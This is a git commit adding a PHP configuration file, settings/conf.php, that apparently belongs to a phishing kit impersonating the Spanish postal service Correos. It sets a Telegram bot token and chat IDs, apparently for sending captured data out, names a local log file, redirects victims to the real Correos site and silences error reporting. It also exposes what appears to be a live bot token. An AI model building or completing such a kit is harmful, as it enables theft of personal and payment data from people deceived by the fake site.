ecc539ce59c455150d439782c422729c92a0b0b4
Pagomente <amall.aff122@gmail.com>
2024-04-14 18:47:45 +0100

    Initial commit

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5275181671:AAHqfVImabc2xC3ivK3zRlsdNFVkkS1yvcI");
+define("TELEGRAM_CHAT_ID", "-1001615435435454365");
+define("TELEGRAM_CHAT_IDD", "-724746752");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
